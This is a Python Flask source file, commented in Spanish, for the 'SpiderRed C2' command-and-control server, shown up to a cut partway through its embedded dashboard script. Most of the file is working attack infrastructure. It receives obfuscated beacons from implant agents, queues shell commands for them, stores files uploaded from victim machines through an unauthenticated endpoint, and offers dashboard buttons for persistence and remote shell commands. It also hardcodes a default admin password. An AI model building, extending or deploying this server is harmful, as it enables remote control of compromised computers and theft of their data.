# spiderred_c2_server.py - Servidor C2 Avanzado con Interfaz Web
import json
import base64
import sqlite3
from datetime import datetime
from flask import Flask, request, jsonify, render_template, send_file, session, redirect, url_for
from flask_socketio import SocketIO, emit
import hashlib
import os
import threading
import time
import uuid
from werkzeug.utils import secure_filename
import logging
from cryptography.fernet import Fernet

# ==================== CONFIGURACIÓN ====================
app = Flask(__name__)
app.config['SECRET_KEY'] = 'SpiderRedC2MasterKey2024!@#$%'
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['DATABASE'] = 'c2_database.db'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB max upload
socketio = SocketIO(app, cors_allowed_origins="*")

# Configuración C2
C2_KEY = "SpiderRedMasterKey2024!@#$%"
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'exe', 'dll', 'ps1', 'bat', 'zip'}

# ==================== UTILIDADES ====================
def xor_encrypt_decrypt(data, key):
    """Cifrado XOR compatible con el agente"""
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ ord(key[i % len(key)]))
    return bytes(result)

def encrypt_data(data, key=C2_KEY):
    """Cifrar datos para el agente"""
    encrypted = xor_encrypt_decrypt(data.encode(), key)
    return base64.b64encode(encrypted).decode()

def decrypt_data(encrypted_data, key=C2_KEY):
    """Descifrar datos del agente"""
    try:
        decoded = base64.b64decode(encrypted_data)
        decrypted = xor_encrypt_decrypt(decoded, key)
        return decrypted.decode('utf-8', errors='ignore')
    except:
        return ""

def init_database():
    """Inicializar base de datos SQLite"""
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    
    # Tabla de agentes
    c.execute('''CREATE TABLE IF NOT EXISTS agents
                 (id TEXT PRIMARY KEY,
                  hostname TEXT,
                  username TEXT,
                  domain TEXT,
                  os TEXT,
                  arch TEXT,
                  privileges TEXT,
                  first_seen TEXT,
                  last_seen TEXT,
                  ip_address TEXT,
                  status TEXT,
                  sleep_interval INTEGER)''')
    
    # Tabla de comandos
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  agent_id TEXT,
                  command TEXT,
                  status TEXT,
                  issued_time TEXT,
                  completed_time TEXT,
                  result TEXT)''')
    
    # Tabla de archivos
    c.execute('''CREATE TABLE IF NOT EXISTS files
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  filename TEXT,
                  agent_id TEXT,
                  upload_time TEXT,
                  size INTEGER,
                  filepath TEXT,
                  file_type TEXT)''')
    
    # Tabla de sesiones
    c.execute('''CREATE TABLE IF NOT EXISTS sessions
                 (session_id TEXT PRIMARY KEY,
                  agent_id TEXT,
                  start_time TEXT,
                  end_time TEXT,
                  data BLOB)''')
    
    # Tabla de usuarios C2
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (username TEXT PRIMARY KEY,
                  password_hash TEXT,
                  role TEXT,
                  last_login TEXT)''')
    
    # Crear usuario admin por defecto
    admin_hash = hashlib.sha256('admin123'.encode()).hexdigest()
    try:
        c.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?)",
                  ('admin', admin_hash, 'admin', datetime.now().isoformat()))
    except:
        pass
    
    conn.commit()
    conn.close()

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# ==================== MODELOS ====================
class C2Agent:
    def __init__(self, agent_id, hostname, username, domain, os, arch, privileges, ip_address):
        self.id = agent_id
        self.hostname = hostname
        self.username = username
        self.domain = domain
        self.os = os
        self.arch = arch
        self.privileges = privileges
        self.ip_address = ip_address
        self.first_seen = datetime.now().isoformat()
        self.last_seen = datetime.now().isoformat()
        self.status = "active"
        self.sleep_interval = 60
        self.command_queue = []
        self.uploaded_files = []
        
    def to_dict(self):
        return {
            'id': self.id,
            'hostname': self.hostname,
            'username': self.username,
            'domain': self.domain,
            'os': self.os,
            'arch': self.arch,
            'privileges': self.privileges,
            'first_seen': self.first_seen,
            'last_seen': self.last_seen,
            'status': self.status,
            'sleep_interval': self.sleep_interval,
            'ip_address': self.ip_address,
            'pending_commands': len(self.command_queue)
        }

class C2Server:
    def __init__(self):
        self.agents = {}
        self.init_db()
        self.load_agents()
        
    def init_db(self):
        init_database()
        
    def load_agents(self):
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute("SELECT * FROM agents")
        rows = c.fetchall()
        
        for row in rows:
            agent = C2Agent(
                row[0], row[1], row[2], row[3], row[4], row[5],
                row[6], row[10]
            )
            agent.first_seen = row[7]
            agent.last_seen = row[8]
            agent.status = row[11] if len(row) > 11 else "active"
            agent.sleep_interval = row[12] if len(row) > 12 else 60
            self.agents[agent.id] = agent
        
        conn.close()
    
    def register_agent(self, agent_data, ip_address):
        agent_id = agent_data.get('agent_id')
        
        if agent_id not in self.agents:
            agent = C2Agent(
                agent_id,
                agent_data.get('hostname'),
                agent_data.get('username'),
                agent_data.get('domain'),
                agent_data.get('os'),
                agent_data.get('arch'),
                agent_data.get('privileges'),
                ip_address
            )
            self.agents[agent_id] = agent
            
            # Guardar en base de datos
            conn = sqlite3.connect(app.config['DATABASE'])
            c = conn.cursor()
            c.execute('''INSERT OR REPLACE INTO agents 
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (agent.id, agent.hostname, agent.username, agent.domain,
                      agent.os, agent.arch, agent.privileges, agent.first_seen,
                      agent.last_seen, agent.ip_address, agent.status,
                      agent.sleep_interval))
            conn.commit()
            conn.close()
            
            socketio.emit('new_agent', agent.to_dict())
            return agent
        else:
            agent = self.agents[agent_id]
            agent.last_seen = datetime.now().isoformat()
            agent.ip_address = ip_address
            
            # Actualizar en base de datos
            conn = sqlite3.connect(app.config['DATABASE'])
            c = conn.cursor()
            c.execute('''UPDATE agents SET last_seen=?, ip_address=?, status=? WHERE id=?''',
                     (agent.last_seen, agent.ip_address, agent.status, agent.id))
            conn.commit()
            conn.close()
            
            socketio.emit('agent_update', agent.to_dict())
            return agent
    
    def add_command(self, agent_id, command):
        if agent_id in self.agents:
            cmd_id = str(uuid.uuid4())[:8]
            cmd_data = {
                'id': cmd_id,
                'command': command,
                'status': 'pending',
                'issued_time': datetime.now().isoformat()
            }
            
            conn = sqlite3.connect(app.config['DATABASE'])
            c = conn.cursor()
            c.execute('''INSERT INTO commands (agent_id, command, status, issued_time)
                         VALUES (?, ?, ?, ?)''',
                     (agent_id, command, 'pending', cmd_data['issued_time']))
            cmd_db_id = c.lastrowid
            conn.commit()
            conn.close()
            
            cmd_data['db_id'] = cmd_db_id
            self.agents[agent_id].command_queue.append(cmd_data)
            
            socketio.emit('new_command', {
                'agent_id': agent_id,
                'command': cmd_data
            })
            
            return cmd_id
        return None
    
    def get_commands(self, agent_id):
        if agent_id in self.agents:
            commands = self.agents[agent_id].command_queue.copy()
            # Limpiar comandos enviados
            self.agents[agent_id].command_queue = [
                cmd for cmd in self.agents[agent_id].command_queue 
                if cmd['status'] != 'sent'
            ]
            return commands
        return []
    
    def save_command_result(self, agent_id, command_id, result):
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        
        # Buscar el comando en la base de datos
        c.execute('''SELECT id FROM commands WHERE agent_id=? AND command LIKE ? 
                     AND status='pending' LIMIT 1''',
                 (agent_id, f"%{command_id}%"))
        
        row = c.fetchone()
        if row:
            cmd_db_id = row[0]
            c.execute('''UPDATE commands SET status='completed', 
                         completed_time=?, result=? WHERE id=?''',
                     (datetime.now().isoformat(), result, cmd_db_id))
            
            # Emitir resultado por WebSocket
            socketio.emit('command_result', {
                'agent_id': agent_id,
                'command_id': command_id,
                'result': result[:500] + "..." if len(result) > 500 else result,
                'completed_time': datetime.now().isoformat()
            })
        
        conn.commit()
        conn.close()
    
    def save_uploaded_file(self, filename, agent_id, filepath, file_size):
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        
        c.execute('''INSERT INTO files (filename, agent_id, upload_time, size, filepath, file_type)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                 (filename, agent_id, datetime.now().isoformat(),
                  file_size, filepath, filename.rsplit('.', 1)[-1].lower() if '.' in filename else 'unknown'))
        
        conn.commit()
        conn.close()
        
        socketio.emit('file_uploaded', {
            'agent_id': agent_id,
            'filename': filename,
            'size': file_size,
            'upload_time': datetime.now().isoformat()
        })
    
    def get_all_agents(self):
        return [agent.to_dict() for agent in self.agents.values()]
    
    def get_agent_commands(self, agent_id):
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('''SELECT * FROM commands WHERE agent_id=? ORDER BY issued_time DESC LIMIT 50''',
                 (agent_id,))
        
        commands = []
        for row in c.fetchall():
            commands.append({
                'id': row[0],
                'command': row[2],
                'status': row[3],
                'issued_time': row[4],
                'completed_time': row[5],
                'result_preview': (row[6][:100] + "...") if row[6] and len(row[6]) > 100 else row[6]
            })
        
        conn.close()
        return commands
    
    def get_uploaded_files(self, agent_id=None):
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        
        if agent_id:
            c.execute('''SELECT * FROM files WHERE agent_id=? ORDER BY upload_time DESC''',
                     (agent_id,))
        else:
            c.execute('''SELECT * FROM files ORDER BY upload_time DESC''')
        
        files = []
        for row in c.fetchall():
            files.append({
                'id': row[0],
                'filename': row[1],
                'agent_id': row[2],
                'upload_time': row[3],
                'size': row[4],
                'file_type': row[6]
            })
        
        conn.close()
        return files

# ==================== INICIALIZACIÓN ====================
c2_server = C2Server()

# ==================== RUTAS API ====================
@app.route('/beacon', methods=['POST'])
def handle_beacon():
    """Endpoint para beacons de agentes"""
    try:
        # Obtener datos del beacon
        encrypted_data = request.get_data(as_text=True)
        decrypted_data = decrypt_data(encrypted_data)
        
        if not decrypted_data:
            return encrypt_data(json.dumps({"error": "Invalid data"}))
        
        beacon_data = json.loads(decrypted_data)
        agent_id = beacon_data.get('agent_id')
        
        if not agent_id:
            return encrypt_data(json.dumps({"error": "No agent ID"}))
        
        # Registrar/actualizar agente
        agent = c2_server.register_agent(beacon_data, request.remote_addr)
        
        # Obtener comandos pendientes
        pending_commands = c2_server.get_commands(agent_id)
        
        # Preparar respuesta
        response = {
            'status': 'ok',
            'commands': pending_commands,
            'sleep': agent.sleep_interval,
            'jitter': 30
        }
        
        # Marcar comandos como enviados
        for cmd in pending_commands:
            cmd['status'] = 'sent'
        
        return encrypt_data(json.dumps(response))
    
    except Exception as e:
        app.logger.error(f"Beacon error: {e}")
        return encrypt_data(json.dumps({"error": str(e)}))

@app.route('/result', methods=['POST'])
def handle_result():
    """Endpoint para resultados de comandos"""
    try:
        encrypted_data = request.get_data(as_text=True)
        decrypted_data = decrypt_data(encrypted_data)
        
        if not decrypted_data:
            return encrypt_data(json.dumps({"error": "Invalid data"}))
        
        result_data = json.loads(decrypted_data)
        agent_id = result_data.get('agent_id')
        command_id = result_data.get('command_id')
        output = result_data.get('output', '')
        
        if agent_id and command_id:
            c2_server.save_command_result(agent_id, command_id, output)
        
        return encrypt_data(json.dumps({"status": "ok"}))
    
    except Exception as e:
        app.logger.error(f"Result error: {e}")
        return encrypt_data(json.dumps({"error": str(e)}))

@app.route('/upload', methods=['POST'])
def handle_upload():
    """Endpoint para subida de archivos"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file part'}), 400
        
        file = request.files['file']
        agent_id = request.form.get('agent_id')
        
        if file.filename == '':
            return jsonify({'error': 'No selected file'}), 400
        
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            unique_filename = f"{timestamp}_{filename}"
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
            
            os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
            file.save(filepath)
            
            file_size = os.path.getsize(filepath)
            c2_server.save_uploaded_file(filename, agent_id, filepath, file_size)
            
            return jsonify({
                'status': 'success',
                'filename': filename,
                'saved_as': unique_filename,
                'size': file_size
            })
        
        return jsonify({'error': 'File type not allowed'}), 400
    
    except Exception as e:
        app.logger.error(f"Upload error: {e}")
        return jsonify({'error': str(e)}), 500

# ==================== INTERFAZ WEB ====================
@app.route('/')
def index():
    """Página principal del C2 Dashboard"""
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('dashboard.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Página de login"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute("SELECT password_hash, role FROM users WHERE username=?", (username,))
        row = c.fetchone()
        conn.close()
        
        if row:
            stored_hash, role = row
            if hashlib.sha256(password.encode()).hexdigest() == stored_hash:
                session['username'] = username
                session['role'] = role
                return redirect(url_for('index'))
        
        return render_template('login.html', error="Invalid credentials")
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Cerrar sesión"""
    session.clear()
    return redirect(url_for('login'))

@app.route('/api/agents')
def api_agents():
    """API para obtener lista de agentes"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    return jsonify(c2_server.get_all_agents())

@app.route('/api/agent/<agent_id>')
def api_agent_details(agent_id):
    """API para obtener detalles de un agente"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    if agent_id in c2_server.agents:
        agent = c2_server.agents[agent_id].to_dict()
        agent['commands'] = c2_server.get_agent_commands(agent_id)
        agent['files'] = c2_server.get_uploaded_files(agent_id)
        return jsonify(agent)
    
    return jsonify({'error': 'Agent not found'}), 404

@app.route('/api/agent/<agent_id>/command', methods=['POST'])
def api_send_command(agent_id):
    """API para enviar comandos a un agente"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    command = request.json.get('command')
    if not command:
        return jsonify({'error': 'No command provided'}), 400
    
    cmd_id = c2_server.add_command(agent_id, command)
    if cmd_id:
        return jsonify({'status': 'success', 'command_id': cmd_id})
    
    return jsonify({'error': 'Agent not found'}), 404

@app.route('/api/agent/<agent_id>/files')
def api_agent_files(agent_id):
    """API para obtener archivos de un agente"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    files = c2_server.get_uploaded_files(agent_id)
    return jsonify(files)

@app.route('/api/files')
def api_all_files():
    """API para obtener todos los archivos"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    files = c2_server.get_uploaded_files()
    return jsonify(files)

@app.route('/api/file/<file_id>')
def api_get_file(file_id):
    """API para descargar un archivo"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute("SELECT filepath, filename FROM files WHERE id=?", (file_id,))
    row = c.fetchone()
    conn.close()
    
    if row and os.path.exists(row[0]):
        return send_file(row[0], as_attachment=True, download_name=row[1])
    
    return jsonify({'error': 'File not found'}), 404

@app.route('/api/command/<command_id>')
def api_get_command_result(command_id):
    """API para obtener resultado completo de un comando"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute("SELECT command, result, issued_time, completed_time FROM commands WHERE id=?", (command_id,))
    row = c.fetchone()
    conn.close()
    
    if row:
        return jsonify({
            'command': row[0],
            'result': row[1],
            'issued_time': row[2],
            'completed_time': row[3]
        })
    
    return jsonify({'error': 'Command not found'}), 404

# ==================== WEBSOCKETS ====================
@socketio.on('connect')
def handle_connect():
    """Manejar conexión WebSocket"""
    if 'username' in session:
        emit('connected', {'message': 'Connected to C2 Dashboard'})

# ==================== PLANTILLAS HTML ====================
@app.route('/templates/<template_name>')
def serve_template(template_name):
    """Servir plantillas HTML"""
    templates = {
        'dashboard': '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🕷️ SpiderRed C2 Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono:wght@300;400&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary: #00ff88;
            --secondary: #ff0080;
            --dark: #0a0a0f;
            --darker: #050508;
            --light: #f0f0f0;
            --terminal: #00ff00;
            --glow: 0 0 10px var(--primary);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Roboto Mono', monospace;
            background: var(--dark);
            color: var(--light);
            line-height: 1.6;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(0, 255, 136, 0.05) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(255, 0, 128, 0.05) 0%, transparent 20%);
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Header */
        header {
            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
            border-bottom: 2px solid var(--primary);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: var(--glow);
            position: relative;
            overflow: hidden;
        }
        
        header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(0, 255, 136, 0.1), transparent);
            animation: pulse 4s linear infinite;
        }
        
        @keyframes pulse {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 10px;
        }
        
        .logo i {
            color: var(--primary);
            font-size: 2.5em;
            filter: drop-shadow(0 0 10px var(--primary));
        }
        
        .logo h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.5em;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid rgba(0, 255, 136, 0.2);
        }
        
        .status-item {
            text-align: center;
        }
        
        .status-value {
            font-size: 1.5em;
            color: var(--primary);
            font-weight: bold;
        }
        
        /* Grid */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        /* Cards */
        .card {
            background: linear-gradient(135deg, rgba(10, 10, 15, 0.9), rgba(5, 5, 8, 0.9));
            border: 1px solid rgba(0, 255, 136, 0.3);
            border-radius: 10px;
            padding: 20px;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
        }
        
        .card:hover {
            border-color: var(--primary);
            box-shadow: var(--glow);
            transform: translateY(-5px);
        }
        
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(0, 255, 136, 0.2);
        }
        
        .card-header h2 {
            color: var(--primary);
            font-family: 'Orbitron', sans-serif;
            font-size: 1.2em;
        }
        
        /* Agent List */
        .agent-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .agent-item {
            background: rgba(0, 0, 0, 0.3);
            border-left: 3px solid var(--primary);
            padding: 10px 15px;
            margin-bottom: 10px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        
        .agent-item:hover {
            background: rgba(0, 255, 136, 0.1);
            transform: translateX(5px);
        }
        
        .agent-name {
            font-weight: bold;
            color: var(--primary);
        }
        
        .agent-info {
            font-size: 0.9em;
            color: #aaa;
            margin-top: 5px;
        }
        
        /* Terminal */
        .terminal {
            background: #000;
            border: 2px solid var(--terminal);
            border-radius: 5px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            color: var(--terminal);
            max-height: 300px;
            overflow-y: auto;
        }
        
        .terminal-line {
            margin-bottom: 5px;
        }
        
        .prompt {
            color: #00ffff;
        }
        
        /* Buttons */
        .btn {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            border: none;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Orbitron', sans-serif;
            transition: all 0.3s ease;
            text-transform: uppercase;
            font-size: 0.9em;
            letter-spacing: 1px;
        }
        
        .btn:hover {
            transform: scale(1.05);
            box-shadow: var(--glow);
        }
        
        .btn-danger {
            background: linear-gradient(45deg, #ff0000, #ff0080);
        }
        
        /* Forms */
        .form-group {
            margin-bottom: 15px;
        }
        
        input, select, textarea {
            width: 100%;
            padding: 10px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid var(--primary);
            border-radius: 5px;
            color: white;
            font-family: 'Roboto Mono', monospace;
        }
        
        input:focus, select:focus, textarea:focus {
            outline: none;
            box-shadow: var(--glow);
        }
        
        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .fade-in {
            animation: fadeIn 0.5s ease forwards;
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: var(--darker);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--primary);
            border-radius: 4px;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .grid {
                grid-template-columns: 1fr;
            }
            
            .logo h1 {
                font-size: 1.8em;
            }
            
            .status-bar {
                flex-direction: column;
                gap: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <i class="fas fa-spider"></i>
                <h1>SPIDERRED C2 v2.0</h1>
            </div>
            <div class="status-bar">
                <div class="status-item">
                    <div class="status-label">Active Agents</div>
                    <div class="status-value" id="active-agents">0</div>
                </div>
                <div class="status-item">
                    <div class="status-label">Commands Today</div>
                    <div class="status-value" id="commands-today">0</div>
                </div>
                <div class="status-item">
                    <div class="status-label">Uptime</div>
                    <div class="status-value" id="uptime">00:00:00</div>
                </div>
                <div class="status-item">
                    <button class="btn" onclick="refreshDashboard()">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                </div>
            </div>
        </header>
        
        <div class="grid">
            <!-- Panel de Agentes -->
            <div class="card fade-in">
                <div class="card-header">
                    <h2><i class="fas fa-robot"></i> ACTIVE AGENTS</h2>
                    <span class="badge" id="agent-count">0</span>
                </div>
                <div class="agent-list" id="agent-list">
                    <!-- Agentos se cargan aquí -->
                </div>
            </div>
            
            <!-- Panel de Control -->
            <div class="card fade-in">
                <div class="card-header">
                    <h2><i class="fas fa-gamepad"></i> AGENT CONTROL</h2>
                </div>
                <div id="control-panel">
                    <div class="form-group">
                        <label>Select Agent:</label>
                        <select id="selected-agent" onchange="loadAgentDetails()">
                            <option value="">-- Select Agent --</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label>Command:</label>
                        <div class="input-group">
                            <input type="text" id="command-input" placeholder="Enter command...">
                            <button class="btn" onclick="sendCommand()">
                                <i class="fas fa-paper-plane"></i> Send
                            </button>
                        </div>
                    </div>
                    
                    <div class="quick-commands">
                        <button class="btn" onclick="quickCommand('info')">System Info</button>
                        <button class="btn" onclick="quickCommand('shell whoami')">Whoami</button>
                        <button class="btn" onclick="quickCommand('persist')">Establish Persistence</button>
                        <button class="btn btn-danger" onclick="quickCommand('exit')">Terminate Agent</button>
                    </div>
                </div>
            </div>
            
            <!-- Terminal -->
            <div class="card fade-in">
                <div class="card-header">
                    <h2><i class="fas fa-terminal"></i> LIVE TERMINAL</h2>
                    <button class="btn" onclick="clearTerminal()">
                        <i class="fas fa-trash"></i> Clear
                    </button>
                </div>
                <div class="terminal" id="terminal">
                    <div class="terminal-line"><span class="prompt">$</span> SpiderRed C2 Initialized</div>
                    <div class="terminal-line"><span class="prompt">$</span> Waiting for agent connections...</div>
                </div>
            </div>
            
            <!-- File Manager -->
            <div class="card fade-in">
                <div class="card-header">
                    <h2><i class="fas fa-folder"></i> FILE MANAGER</h2>
                </div>
                <div id="file-manager">
                    <div class="form-group">
                        <input type="file" id="file-upload">
                        <button class="btn" onclick="uploadFile()">
                            <i class="fas fa-upload"></i> Upload
                        </button>
                    </div>
                    <div id="file-list">
                        <!-- Files appear here -->
                    </div>
                </div>
            </div>
            
            <!-- Command History -->
            <div class="card fade-in">
                <div class="card-header">
                    <h2><i class="fas fa-history"></i> COMMAND HISTORY</h2>
                </div>
                <div id="command-history">
                    <!-- History appears here -->
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.0/socket.io.min.js"></script>
    <script>
        let socket = io();
        let selectedAgent = null;
        let startTime = Date.now();
        
        // Actualizar uptime
        function updateUptime() {
            let elapsed = Date.now() - startTime;
            let hours = Math.floor(elapsed / 3600000);
            let minutes = Math.floor((elapsed % 3600000) / 60000);
            let seconds = Math.floor((elapsed % 60000) / 1000);
            
            document.getElementById('uptime').textContent = 
                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
        setInterval(updateUptime, 1000);
        
        // WebSocket events
        socket.on('connect', function() {
            addTerminalLine('Connected to C2 Server');
        });
        
        socket.on('new_agent', function(agent) {
            addTerminalLine(`New agent connected: ${agent.hostname} (${agent.username})`);
            loadAgents();
        });
        
        socket.on('agent_update', function(agent) {
            addTerminalLine(`Agent updated: ${agent.hostname}`);
            loadAgents();
        });
        
        socket.on('new_command', function(data) {
            addTerminalLine(`Command sent to ${data.agent_id}: ${data.command.command}`);
        });
        
        socket.on('command_result', function(data) {
            addTerminalLine(`Result from ${data.agent_id}: ${data.result}`);
            addToCommandHistory(data);
        });
        
        socket.on('file_uploaded', function(data) {
            addTerminalLine(`File uploaded from ${data.agent_id}: ${data.filename} (${data.size} bytes)`);
            loadFiles();
        });
        
        // Cargar agentes
        async function loadAgents() {
            try {
                const response = await fetch('/api/agents');
                const agents = await response.json();
                
                document.getElementById('agent-count').textContent = agents.length;
                document.getElementById('active-agents').textContent = agents.length;
                
                const agentList = document.getElementById('agent-list');
                const agentSelect = document.getElementById('selected-agent');
                
                agentList.innerHTML = '';
                agentSelect.innerHTML = '<option value="">-- Select Agent --</option>';
                
                agents.forEach(agent => {
                    // Add to list
                    const agentItem = document.createElement('div');
                    agentItem.className = 'agent-item';
                    agentItem.onclick = () => selectAgent(agent.id);
                    agentItem.innerHTML = `
                        <div class="agent-name">${agent.hostname}</div>
                        <div class="agent-info">
                            ${agent.username}@${agent.domain} | ${agent.os} | ${agent.privileges}
                        </div>
                        <div class="agent-info">
                            Last seen: ${new Date(agent.last_seen).toLocaleString()}
                        </div>
                    `;
                    agentList.appendChild(agentItem);
                    
                    // Add to select
                    const option = document.createElement('option');
                    option.value = agent.id;
                    option.textContent = `${agent.hostname} (${agent.username})`;
                    agentSelect.appendChild(option);
                });
            } catch (error) {
                console.error('Error loading agents:', error);
            }
        }
        
        // Seleccionar agente
        function selectAgent(agentId) {
            selectedAgent = agentId;
            document.getElementById('selected-agent').value = agentId;
            loadAgentDetails();
        }
        
        // Cargar detalles del agente
        async function loadAgentDetails() {
            const agentId = document.getElementById('selected-agent').value;
            selectedAgent = agentId;
            
            if (!agentId) return;
            
            try {
                const response = await fetch(`/api/agent/${agentId}`);
                const agent = await response.json();
                
                addTerminalLine(`Selected agent: ${agent.hostname}`);
            } catch (error) {
                console.error('Error loading agent details:', error);
            }
        }
        
        // Enviar comando
        async function sendCommand() {
            const command = document.getElementById('command-input').value;
            if (!command || !selectedAgent) return;
            
            try {
                const response = await fetch(`/api/agent/${selectedAgent}/command`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: command })
                });
                
                const result = await response.json();
                if (result.status === 'success') {
                    addTerminalLine(`Command sent: ${command}`);
                    document.getElementById('command-input').value = '';
                    
                    // Update command counter
                    let count = parseInt(document.getElementById('commands-today').textContent);
                    document.getElementById('commands-today').textContent = count + 1;
                }
            } catch (error) {
                console.error('Error sending command:', error);
            }
        }
        
        // Comandos rápidos
        function quickCommand(cmd) {
            if (!selectedAgent) {
                addTerminalLine('Please select an agent first');
                return;
            }
            
            document.getElementById('command-input').value = cmd;
            sendCommand();
        }
        
        // Subir archivo
        async function uploadFile() {
            const fileInput = document.getElementById('file-upload');
            const file = fileInput.files[0];
            
            if (!file || !selectedAgent) return;
            
            const formData = new FormData();
            formData.append('file', file);
            formData.append('agent_id', selectedAgent);
            
            try {
                const response = await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (result.status === 'success') {
                    addTerminalLine(`File uploaded: ${result.filename}`);
                }
            } catch (error) {
                console.error('Error uploading file:', error);
            }
        }
        
        // Cargar archivos
        async function loadFiles() {
            try {
                const response = await fetch('/api/files');
                const files = await response.json();
                
                const fileList = document.getElementById('file-list');
                fileList.innerHTML = '';
                
                files.forEach(file => {
                    const fileItem = document.createElement('div');
                    fileItem.className = 'agent-item';
                    fileItem.innerHTML = `
                        <div class="agent-name">${file.filename}</div>
                        <div class="agent-info">
                            From: ${file.agent_id} | Size: ${(file.size / 1024).toFixed(2)} KB
                        </div>
                        <div class="agent-info">
                            ${new Date(file.upload_time).toLocaleString()}
                        </div>
                        <button class="btn" onclick="downloadFile(${file.id})">
                            <i class="fas fa-download"></i> Download
                        </button>
                    `;
                    fileList.appendChild(fileItem);
                });
            } catch (error) {
                console.error('Error loading files:', error);
            }
        }
        
        // Descargar archivo
        async function downloadFile(fileId) {
            window.open(`/api/file/${fileId}`, '_blank');
        }
        
